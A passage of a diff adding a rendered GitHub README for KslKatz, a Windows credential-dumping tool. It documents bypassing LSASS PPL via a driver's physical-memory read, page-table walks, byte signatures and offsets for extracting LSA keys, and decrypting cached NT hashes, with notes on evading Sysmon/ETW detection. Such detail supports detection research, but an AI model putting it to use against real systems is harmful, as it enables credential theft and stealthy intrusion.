+   -> All offsets detected dynamically, no hardcoded values per build
+
+5. Walk ActiveProcessLinks doubly-linked list
+   -> Read ImageFileName at each EPROCESS
+   -> Match &quot;lsass.exe&quot; -> extract DTB from EPROCESS+0x28
+   -> Auto-detect PEB offset by scanning for valid usermode pointer with PEB/LDR structure" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<details>
+<summary><b>Why not use PsInitialSystemProcess?</b></summary>
+<p dir="auto">Tools like GhostKatz and Mimikatz locate the SYSTEM EPROCESS by resolving <code>PsInitialSystemProcess</code> from ntoskrnl.exe exports (<code>EnumDeviceDrivers</code> + <code>LoadLibrary("ntoskrnl.exe")</code> + <code>GetProcAddress</code>). This approach has two problems:</p>
+<ol dir="auto">
+<li>
+<p dir="auto"><strong>LoadLibrary triggers ETW/Sysmon events.</strong> Loading ntoskrnl.exe into the process generates Image Load events (Sysmon Event 7) that defensive tools monitor.</p>
+</li>
+<li>
+<p dir="auto"><strong>Export directory is broken on recent builds.</strong> On Windows 11 Build 26200+, ntoskrnl's PE export directory header has <code>exp_sz=0x6b</code> (only 107 bytes), with actual export tables at separate RVAs. Both Python and C++ PE parsers fail to resolve exports from this layout.</p>
+</li>
+</ol>
+<p dir="auto">The <code>SystemHandleInformation</code> approach avoids both problems: no DLL loading, no export parsing, and it works on all tested builds from 7600 to 26200.</p>
+</details>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Physical Memory Read and PPL Bypass</h3><a id="user-content-physical-memory-read-and-ppl-bypass" class="anchor" aria-label="Permalink: Physical Memory Read and PPL Bypass" href="https://github.com/k3nundrum/KslKatz#physical-memory-read-and-ppl-bypass"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Protected Process Light (PPL) was designed to prevent credential theft by blocking <code>OpenProcess</code> and <code>ReadProcessMemory</code> calls against LSASS from usermode. However, PPL only protects the usermode API path. It has no authority over kernel-mode physical memory operations.</p>
+<p dir="auto">KslD.sys SubCmd 12 calls <code>MmCopyMemory()</code> with attacker-supplied physical addresses. This kernel API operates below the process protection layer and reads physical memory pages regardless of which process owns them.</p>
+<p dir="auto">KslKatz translates lsass virtual addresses to physical addresses using a manual page table walk. GhostKatz uses Superfetch (<code>NtQuerySystemInformation</code> Class 79) for this purpose, building a global PFN-to-VA translation table. Both approaches achieve the same result through different means.</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>lsass DTB (from EPROCESS+0x28)
+  |
+  CR3 -&gt; PML4 Table (512 entries, each 8 bytes)
+    -&gt; PML4E[va_bits[47:39]] -&gt; PDPT Table
+      -&gt; PDPTE[va_bits[38:30]] -&gt; Page Directory
+        -&gt; Large page (1GB)? -&gt; PA = (entry &amp; mask) | va_offset
+        -&gt; PDE[va_bits[29:21]] -&gt; Page Table
+          -&gt; Large page (2MB)? -&gt; PA = (entry &amp; mask) | va_offset
+          -&gt; PTE[va_bits[20:12]] -&gt; 4KB Page
+            -&gt; PA = (PTE &amp; 0xFFFFFFFFF000) | va_bits[11:0]
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="lsass DTB (from EPROCESS+0x28)
+  |
+  CR3 -> PML4 Table (512 entries, each 8 bytes)
+    -> PML4E[va_bits[47:39]] -> PDPT Table
+      -> PDPTE[va_bits[38:30]] -> Page Directory
+        -> Large page (1GB)? -> PA = (entry &amp; mask) | va_offset
+        -> PDE[va_bits[29:21]] -> Page Table
+          -> Large page (2MB)? -> PA = (entry &amp; mask) | va_offset
+          -> PTE[va_bits[20:12]] -> 4KB Page
+            -> PA = (PTE &amp; 0xFFFFFFFFF000) | va_bits[11:0]" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">Each level requires one physical read via SubCmd 12. A full translation takes 4-5 IOCTLs. The implementation also handles transition pages (standby list, bit 11 set in PTE) which are common for LSASS memory that has been trimmed from the working set but not paged out.</p>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">LSA Key Extraction</h3><a id="user-content-lsa-key-extraction" class="anchor" aria-label="Permalink: LSA Key Extraction" href="https://github.com/k3nundrum/KslKatz#lsa-key-extraction"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">LSASS encrypts all cached credentials using two symmetric keys (AES-256 and 3DES-168) and a 16-byte initialization vector. These are stored in global variables inside <code>lsasrv.dll</code> and referenced by code patterns that Mimikatz originally identified.</p>
+<p dir="auto">KslKatz uses a <strong>local file scan</strong> approach instead of scanning remote lsass memory:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>1. ReadFile("C:\Windows\System32\lsasrv.dll")
+   -&gt; Read entire DLL as raw bytes (std::ifstream, no LoadLibrary, no ETW event)
+
+2. Parse PE header manually
+   -&gt; Find .text section: raw_offset, raw_size, virtual_address
+
+3. Scan .text raw bytes for signature patterns
+   -&gt; 9 signature variants covering Windows Vista through 11 24H2
+   -&gt; Each signature has offsets to IV, 3DES key ptr, and AES key ptr
+
+4. Resolve RIP-relative displacements from raw bytes
+   -&gt; disp32 at sig_offset + iv_off
+   -&gt; target_rva = text_virtual_address + instruction_offset + 4 + disp32
+
+5. Convert RVA to lsass virtual address
+   -&gt; target_va = lsasrv_base_in_lsass + target_rva
+
+6. Read actual key data from lsass (3 targeted physical reads)
+   -&gt; IV: 16 bytes directly
+   -&gt; h3DesKey and hAesKey: pointer dereference + BCRYPT structure traversal
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="1. ReadFile(&quot;C:\Windows\System32\lsasrv.dll&quot;)
+   -> Read entire DLL as raw bytes (std::ifstream, no LoadLibrary, no ETW event)
+
+2. Parse PE header manually
+   -> Find .text section: raw_offset, raw_size, virtual_address
+
+3. Scan .text raw bytes for signature patterns
+   -> 9 signature variants covering Windows Vista through 11 24H2
+   -> Each signature has offsets to IV, 3DES key ptr, and AES key ptr
+
+4. Resolve RIP-relative displacements from raw bytes
+   -> disp32 at sig_offset + iv_off
+   -> target_rva = text_virtual_address + instruction_offset + 4 + disp32
+
+5. Convert RVA to lsass virtual address
+   -> target_va = lsasrv_base_in_lsass + target_rva
+
+6. Read actual key data from lsass (3 targeted physical reads)
+   -> IV: 16 bytes directly
+   -> h3DesKey and hAesKey: pointer dereference + BCRYPT structure traversal" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<details>
+<summary><b>Why read from disk instead of LoadLibrary?</b></summary>
+<p dir="auto"><code>LoadLibraryA("lsasrv.dll")</code> would load the DLL into our process, which:</p>
+<ul dir="auto">
+<li>Triggers Sysmon Event 7 (Image Load) and ETW <code>Microsoft-Windows-Kernel-Process</code> events</li>
+<li>Executes <code>DllMain</code> with potential side effects</li>
+<li>Appears in the PEB module list, visible to any process inspector</li>
+</ul>
+<p dir="auto">Reading the file from disk with <code>std::ifstream</code> generates only a standard file read operation. No image load event, no DllMain execution, no PEB entry. The raw bytes contain the same <code>.text</code> section with the same signatures and the same RIP-relative displacements. The only difference is that addresses must be computed as RVAs (relative to section virtual address) rather than absolute pointers.</p>
+<p dir="auto">This is also how KslKatz differs from GhostKatz, which uses <code>LoadLibraryA</code> for its local signature scans.</p>
+</details>
+<details>
+<summary><b>BCRYPT key structure traversal</b></summary>
+<p dir="auto">The LSA key variables (<code>hAesKey</code>, <code>h3DesKey</code>) are pointers to <code>BCRYPT_HANDLE_KEY</code> structures. The actual symmetric key bytes are buried three levels deep:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>hAesKey (global variable in lsasrv.dll .data section)
+  |
+  poi(hAesKey) -&gt; BCRYPT_HANDLE_KEY
+    +0x00: size
+    +0x04: tag = "UUUR" (0x55555552)    &lt;- validation checkpoint
+    +0x08: hAlgorithm
+    +0x10: key pointer -----------------&gt; BCRYPT_KEY81
+      +0x00: size
+      +0x04: tag = "MSSK" (0x4D53534B)  &lt;- validation checkpoint
+      +0x08: type, unk0-unk9 fields
+      +0x38: HARD_KEY
+        +0x00: cbSecret (ULONG, key length in bytes)
+        +0x04: data[cbSecret]            &lt;- actual AES/3DES key bytes
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="hAesKey (global variable in lsasrv.dll .data section)
+  |
+  poi(hAesKey) -> BCRYPT_HANDLE_KEY
+    +0x00: size
+    +0x04: tag = &quot;UUUR&quot; (0x55555552)    <- validation checkpoint
+    +0x08: hAlgorithm
+    +0x10: key pointer -----------------> BCRYPT_KEY81
+      +0x00: size
+      +0x04: tag = &quot;MSSK&quot; (0x4D53534B)  <- validation checkpoint
+      +0x08: type, unk0-unk9 fields
+      +0x38: HARD_KEY
+        +0x00: cbSecret (ULONG, key length in bytes)
+        +0x04: data[cbSecret]            <- actual AES/3DES key bytes" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">The <code>hk_off</code> field in the signature table specifies the offset to <code>HARD_KEY</code> within the key structure. This varies by Windows version:</p>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Structure</th>
+<th>hk_off</th>
+<th>Windows Versions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>BCRYPT_KEY</code></td>
+<td><code>0x18</code></td>
+<td>Vista, 7</td>
+</tr>
+<tr>
+<td><code>BCRYPT_KEY80</code></td>
+<td><code>0x28</code></td>
+<td>8, 8.1</td>
+</tr>
+<tr>
+<td><code>BCRYPT_KEY81</code></td>
+<td><code>0x38</code></td>
+<td>10, 11, Server 2016+</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">KslKatz validates both the "UUUR" and "MSSK" tags before reading key data to prevent false positives from stale or incorrect signature matches.</p>
+</details>
+<details>
+<summary><b>All supported LSA key signatures</b></summary>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>IV Offset</th>
+<th>DES Offset</th>
+<th>AES Offset</th>
+<th>hk_off</th>
+<th>Windows Versions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15</code></td>
+<td>71</td>
+<td>-89</td>
+<td>16</td>
+<td>0x38</td>
+<td>11 22H2+</td>
+</tr>
+<tr>
+<td>Same pattern</td>
+<td>58</td>
+<td>-89</td>
+<td>16</td>
+<td>0x38</td>
+<td>11 21H2</td>
+</tr>
+<tr>
+<td>Same pattern</td>
+<td>67</td>
+<td>-89</td>
+<td>16</td>
+<td>0x38</td>
+<td>10 1809-1909</td>
+</tr>
+<tr>
+<td>Same pattern</td>
+<td>61</td>
+<td>-73</td>
+<td>16</td>
+<td>0x38</td>
+<td>10 1507-1803</td>
+</tr>
+<tr>
+<td><code>83 64 24 30 00 44 8b 4d d8 48 8b 0d</code></td>
+<td>62</td>
+<td>-70</td>
+<td>23</td>
+<td>0x38</td>
+<td>8.1 (KEY81)</td>
+</tr>
+<tr>
+<td>Same pattern</td>
+<td>62</td>
+<td>-70</td>
+<td>23</td>
+<td>0x28</td>
+<td>8 (KEY80)</td>
+</tr>
+<tr>
+<td>Same pattern</td>
+<td>58</td>
+<td>-62</td>
+<td>23</td>
+<td>0x28</td>
+<td>8 (alternate)</td>
+</tr>
+<tr>
+<td><code>83 64 24 30 00 44 8b 4c 24 48 48 8b 0d</code></td>
+<td>59</td>
+<td>-61</td>
+<td>25</td>
+<td>0x18</td>
+<td>7</td>
+</tr>
+<tr>
+<td>Same pattern</td>
+<td>63</td>
+<td>-69</td>
+<td>25</td>
+<td>0x18</td>
+<td>Vista</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+</details>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">MSV1_0 Credential Extraction</h3><a id="user-content-msv1_0-credential-extraction" class="anchor" aria-label="Permalink: MSV1_0 Credential Extraction" href="https://github.com/k3nundrum/KslKatz#msv1_0-credential-extraction"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">MSV1_0 is the primary authentication package in Windows. It caches NT hashes for every interactive logon session. The <code>LogonSessionList</code> is a linked list (or array of linked lists on newer builds) inside <code>lsasrv.dll</code> containing all active sessions.</p>
+<p dir="auto">KslKatz locates <code>LogonSessionList</code> using the same local-file-scan technique, then walks the list via physical memory reads:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>LogonSessionList[0..count-1]    (array of list heads, count from LogonSessionListCount)
+  |
+  poi(head) -&gt; Flink
+  |
+  Entry (KIWI_MSV1_0_LIST_63)
+    +0x00: Flink                         -&gt; next entry
+    +0x70: LUID                          -&gt; logon session ID
+    +0x90: Username (UNICODE_STRING)     -&gt; e.g. "admin"
+    +0xA0: Domain (UNICODE_STRING)       -&gt; e.g. "YOURDOM"
+    +0xD0: pSid                          -&gt; user SID
+    +0x108: Credentials pointer ---------&gt; KIWI_MSV1_0_CREDENTIALS
+      +0x00: next                          -&gt; credential chain (linked list)
+      +0x10: PrimaryCredentials ---------&gt; KIWI_MSV1_0_PRIMARY_CREDENTIALS
+        +0x00: next                        -&gt; primary cred chain
+        +0x08: Primary (ANSI_STRING)       -&gt; package name, must be "Primary"
+        +0x18: encrypted blob length
+        +0x20: encrypted blob pointer ---&gt; encrypted MSV1_0_PRIMARY_CREDENTIAL
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="LogonSessionList[0..count-1]    (array of list heads, count from LogonSessionListCount)
+  |
+  poi(head) -> Flink
+  |
+  Entry (KIWI_MSV1_0_LIST_63)
+    +0x00: Flink                         -> next entry
+    +0x70: LUID                          -> logon session ID
+    +0x90: Username (UNICODE_STRING)     -> e.g. &quot;admin&quot;
+    +0xA0: Domain (UNICODE_STRING)       -> e.g. &quot;YOURDOM&quot;
+    +0xD0: pSid                          -> user SID
+    +0x108: Credentials pointer ---------> KIWI_MSV1_0_CREDENTIALS
+      +0x00: next                          -> credential chain (linked list)
+      +0x10: PrimaryCredentials ---------> KIWI_MSV1_0_PRIMARY_CREDENTIALS
+        +0x00: next                        -> primary cred chain
+        +0x08: Primary (ANSI_STRING)       -> package name, must be &quot;Primary&quot;
+        +0x18: encrypted blob length
+        +0x20: encrypted blob pointer ---> encrypted MSV1_0_PRIMARY_CREDENTIAL" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">The encrypted blob is decrypted using the LSA keys:</p>
+<ul dir="auto">
+<li>If <code>blob_length % 8 != 0</code>: <strong>AES-CFB128</strong> with hAesKey + full IV (16 bytes)</li>
+<li>If <code>blob_length % 8 == 0</code>: <strong>3DES-CBC</strong> with h3DesKey + IV[:8]</li>
+</ul>
+<p dir="auto">The decrypted <code>MSV1_0_PRIMARY_CREDENTIAL</code> structure contains:</p>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Size</th>
+<th>Field</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x40</td>
+<td>1</td>
+<td>isIso (Credential Guard isolated)</td>
+</tr>
+<tr>
+<td>0x41</td>
+<td>1</td>
+<td>isNtOwfPassword (NT hash present)</td>
+</tr>
+<tr>
+<td>0x46</td>
+<td>16</td>
+<td>NT Hash</td>
+</tr>
+<tr>
+<td>0x56</td>
+<td>16</td>
+<td>LM Hash</td>
+</tr>
+<tr>
+<td>0x66</td>
+<td>20</td>
+<td>SHA1 Hash</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">KslKatz checks <code>isIso == 0</code> and <code>isNtOwfPassword == 1</code> before extracting hashes. If Credential Guard is active, <code>isIso</code> will be set and the actual hashes are isolated in the Virtualization-Based Security (VBS) enclave, inaccessible even through physical memory reads.</p>
+<details>
+<summary><b>When are MSV1_0 credentials cached?</b></summary>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Logon Type</th>
+<th>Scenario</th>
+<th>Credentials Cached</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Type 2 (Interactive)</td>
+<td>Console login, UAC elevation</td>
+<td>Yes, NT/LM/SHA1</td>
+</tr>
+<tr>
+<td>Type 10 (RemoteInteractive)</td>
+<td>RDP session</td>
+<td>Yes, NT/LM/SHA1</td>
+</tr>
+<tr>
+<td>Type 9 (NewCredentials)</td>
+<td><code>runas /netonly</code></td>
+<td>Yes, for the new identity</td>
+</tr>
+<tr>
+<td>Type 5 (Service)</td>
+<td>Service running as domain account</td>
+<td>Yes, while service runs</td>
+</tr>
+<tr>
+<td>Type 3 (Network)</td>
+<td>SMB/NTLM network authentication</td>
+<td>Session token only, <strong>no hash cache</strong></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">Credentials persist for the lifetime of the logon session. A user logged in via RDP with a disconnected (not logged off) session has their hashes in memory until the session is terminated. This is why credential hygiene and session management matter.</p>
+</details>
+<details>
+<summary><b>All supported LogonSessionList signatures</b></summary>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Offset</th>
+<th>min_build</th>
+<th>Windows Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>45 89 34 24 48 8b fb 45 85 c0 0f</code></td>
+<td>25</td>
+<td>26200</td>
+<td>11 24H2/25H2</td>
+</tr>
+<tr>
+<td><code>45 89 34 24 8b fb 45 85 c0 0f</code></td>
+<td>25</td>
+<td>26200</td>
+<td>11 24H2 (alt)</td>
+</tr>
+<tr>
+<td><code>45 89 37 49 4c 8b f7 8b f3 45 85 c0 0f</code></td>
+<td>27</td>
+<td>22631</td>
+<td>11 22H2-23H2</td>
+</tr>
+<tr>
+<td><code>45 89 34 24 4c 8b ff 8b f3 45 85 c0 74</code></td>
+<td>24</td>
+<td>20348</td>
+<td>Server 2022, 11 21H2</td>
+</tr>
+<tr>
+<td><code>33 ff 41 89 37 4c 8b f3 45 85 c0 74</code></td>
+<td>23</td>
+<td>18362</td>
+<td>10 1903-2004</td>
+</tr>
+<tr>
+<td><code>33 ff 41 89 37 4c 8b f3 45 85 c9 74</code></td>
+<td>23</td>
+<td>17134</td>
+<td>10 1803</td>
+</tr>
+<tr>
+<td><code>33 ff 45 89 37 48 8b f3 45 85 c9 74</code></td>
+<td>23</td>
+<td>15063</td>
+<td>10 1703</td>
+</tr>
+<tr>
+<td><code>33 ff 41 89 37 4c 8b f3 45 85 c0 74</code></td>
+<td>16</td>
+<td>10240</td>
+<td>10 1507-1607</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+</details>
